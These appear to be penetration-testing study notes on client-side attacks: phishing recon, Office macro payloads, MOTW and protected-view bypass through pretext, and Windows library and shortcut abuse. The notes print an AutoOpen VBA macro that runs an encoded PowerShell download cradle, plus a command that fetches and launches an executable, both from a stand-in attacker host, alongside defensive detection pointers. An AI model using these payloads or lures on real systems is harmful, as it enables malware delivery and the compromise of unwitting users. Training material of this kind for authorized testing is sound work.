  14. ## TLDR;
  15. ​
  16. Client-side compromises hinge on believable pretext, payload quality, and disciplined logging. The lab notes captured repeatable recipes—this update folds them in.
  17. ​
  18. ### Recon That Drives Pretext
  19. ​
  20. - Mine LinkedIn, GitHub, and company press releases for tooling references (Office macros, Adobe forms, Teams).
  21. - Capture target operating systems with web beacon lures or email auto-responses; record user-agent strings.
  22. - Build a spreadsheet of candidate targets, their job roles, and the lure theme that fits (e.g., “Quarterly security update”).
  23. ​
  24. ### Macro Payload Workflow
  25. ​
  26. 1. Draft the lure document (existing corporate template, logos, styles).
  27. 2. Embed the macro in `ThisDocument` or `AutoOpen`.
  28. 3. Stage payloads using PowerShell-to-base64 encoding.
  29. ​
  30. ```
  31. payload=$(echo -n "IEX(New-Object Net.WebClient).DownloadString('https://attacker/payload.ps1')" | iconv -t UTF-16LE | base64 -w 0)
  32. cat <<'VBA' > macro.vba
  33. Sub AutoOpen()
  34. Dim cmd As String
  35. cmd = "powershell -nop -w hidden -enc " & """$payload"""
  36. CreateObject("Wscript.Shell").Run cmd
  37. End Sub
  38. VBA
  39. ```
  40. ​
  41. 4. Sign the macro if the client provides a code-signing cert; log hash, timestamp, and signer.
  42. 5. Validate in a sandbox (Hyper-V/VMware snapshot) before delivery.
  43. ​
  44. ### Windows Library & Shortcut Abuses
  45. ​
  46. - Craft `.library-ms` pointing to an attacker-controlled share; host payload DLLs via SMB/WebDAV.
  47. - Build `.lnk` shortcuts launching PowerShell or `regsvr32 /s /n /u /i:https://... scrobj.dll` commands.
  48. ​
  49. ```
  50. mklink payload.lnk "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
  51. powershell.exe -Command "$client = New-Object Net.WebClient; $client.DownloadFile('https://attacker/payload.exe','%TEMP%\upd.exe'); Start-Process '%TEMP%\upd.exe'"
  52. ```
  53. ​
  54. Document which Windows warning prompts appear during testing; include mitigations (MOTW enforcement, macro policy) in the report.
  55. ​
  56. ### Delivery & Tracking
  57. ​
  58. - Send emails via `swaks` with SPF/DKIM-aligned headers if the client authorises domain spoofing.
  59. - Track opens and payload callbacks with unique IDs per recipient (append `?id=alice` to URLs, embed beacon images).
  60. - Record timezone, send time, and follow-up results in the engagement timeline.
  61. ​
  62. ### Defensive Counterpoints
  63. ​
  64. - Recommend enabling `Block macros from the Internet`, deploying AMSI-aware scanners, and enforcing application control.
  65. - Provide detection pointers: Event IDs (3008 macro execution, 4104 PowerShell script block), Sysmon configs catching LOLBAS abuse.
  66. ​
  67. Client-side operations reward preparation. Blend into genuine workflows, keep payload telemetry, and deliver actionable blue-team guidance alongside the exploit narrative.

  277. #### 11.2 Exploiting Microsoft Office
  278. ​
  279. - Understand variations of Microsoft Office client-side attacks.
  280. - Install Microsoft Office.
  281. - Leverage Microsoft Word Macros.
  282. ​
  283. ##### Preparing the Attack
  284. ​
  285. Important considerations when using malicious Office Doc in a client-side attack.
  286. ​
  287. - Delivery method.
  288. - Macro attacks are well known, email provider spam filters often filter out all MS Office Docs.
  289. - In most cases we can't just send it as an email attachment.
  290. - Most anti-phishing training programs stress the danger of enabling macros in an emailed Office Doc.
  291. ​
  292. To deliver the Doc and increase the chance of target opening it, we have to use a convincing pretext and an alternate delivery method. A download link for example.
  293. ​
  294. If succesfully delivered and opened, the doc will be tagged with the ["Mark of the Web" (MOTW)](https://attack.mitre.org/techniques/T1553/005/). An Office doc tagged with MOTW will open in a [protected view](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653) which disabled editing and blocks the execution of macros or embedded objects. When a target opens a MOTW Doc, they see a warning with the option to Enable Editing.
  295. ​
  296. When the target enables editing, the protected view is disabled. The most direct way to bypass MOTW is to convince the target to click Enable Editing.
  297. ​
  298. - Example;
  299. - Blur the body of the doc and intruct the target to click the Enable Editing button to view it.
  300. ​
  301. Not all Office docs have a protected view, Microsoft Publisher does not but is less frequently present on a system.
  302. ​
  303. Microsoft also announced blocking macros by default. Affecting Access, Excel, PowerPoint, Visio, and Word in most Office versions from 2013-2021. Dates can be found in [MS Learn page](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked).
  304. ​
  305. The Enable Content button is no longer available for Office docs delivered from the internet. A more tedious process of following a link outlining the dangers, following instructions, and checking a box in settings. This complicated the vector, but with thorough enumeration and considering the information here the chance of success increases greatly.
  306. ​
  307. Despite the mitigation and heightened awareness, malicious Office Docs are still one of the most widely used client-side attack vectors. This highlights the dynamic between attacker and defender. For each security measure implemented the attacker is forced to develop a novel vectors and bypass methods. New defense mechanisms are just opportunities to develop more sophisticated attacks.
  308. ​
  309. ##### Leveraging Microsoft Word Macros
  310. ​
  311. - Office apps like Word and Excel allow users to embed macros.
  312. - Macros execute a series of commands/instructions.
  313. - Orgs use macros to manage dynamic content and link docs to external content.
  314. - *Macros can be written from scratch in [Visual Basic for Applications (VBA)](https://docs.microsoft.com/en-us/office/vba/api/overview/), which is a powerful scripting language with full access to [ActiveX objects](https://en.wikipedia.org/wiki/ActiveX) and the Windows Script Host, similar to JavaScript in HTML Applications.*.
  315. ​
  316. Example; we will embed a macro in a Word doc to launch a reverse shell when the document is opened. Macros are one of the oldest and most well known attack vectors and still work well today, keeping in mind the mitigation described in the previous section.
  317. ​
  318. - *Bear in mind that older client-side attack vectors, including [Dynamic Data Exchange (DDE)](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN) and various [Object Linking and Embedding (OLE)](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding) methods do not work well today without significant target system modification.*.
  319. - Create a blank Word doc `mymacro`
  320. - Save it as a `doc`
  321. - Newer `docx` files require a template be attached.
  322. - They cannot be embeded, thus are not persistent.
  323. - Can also use `docm`
  324. - Click View tab.
  325. - Find and click the Macros button.
  326. - In the Macro menu.
  327. - Enter macro name `MyMacro`
  328. - Select from Macros in drop down `mymacro` document.
  329. - Then click Create.
  330. - This creates the Macro framework and opens a VB editor for us to develop our macro.
  331. - We can develop from scratch or use the provided skeleton.
  332. - The skeleton.
  333. - The main sub proceedure begins with the `Sub` keyword.
  334. - It ends with `End Sub`
  335. - This is the body of the Macro.
  336. - *A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.*.
  337. - At this point `MyMacro()` is an emptly sub proceedure with several single line comments starting with `!` chars.
  338. ​
  339. ```
  340. Sub MyMacro()

  342. ' MyMacro Macro
  343. '
  344. '
  345. ​
  346. End Sub
  347. ```
  348. ​
  349. - In this example we will use ActiveX Objects.
  350. - They provide access to underlying system commands.
  351. - Achieved through the [WScript](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31%28v=vs.84%29 "https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31(v=vs.84)") through the [Windows Script Host Shell object](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99%28v=vs.84%29 "https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)")
  352. - Once the [Windows Host Shell object with CreateObject](https://learn.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function) you can invoke the Run method for WScript.Shell to run applications on the client machine.

  477. ##### 11.3 Abusing Windows Library Files
  478. ​
  479. - Prepare an attack with Windows library files.
  480. - Leverage Windows shortcuts to obtain code execution.
  481. ​
  482. ###### Attaining Code Execution via Windows Library Files
  483. ​
  484. Win Library files are virtual containers that connect users with content stored in remote locations;
